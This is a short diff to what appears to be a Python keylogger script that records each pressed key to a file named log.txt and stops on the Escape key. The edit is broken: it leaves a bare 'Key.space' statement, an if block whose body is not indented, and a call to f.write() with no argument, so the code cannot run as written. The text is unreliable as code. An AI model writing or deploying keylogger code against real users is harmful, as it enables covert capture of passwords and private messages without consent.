@@ -20,7 +20,10 @@ def onpress(key):
 def writefile(keys):
     with open("log.txt", "a") as f:
         for key in keys:
-            f.write(key)
+            k = str(key).replace("'","")
+            Key.space
+            if k.find("space") > 0:
+            f.write()
 
 def onrelease(key):
     if key == Key.esc:
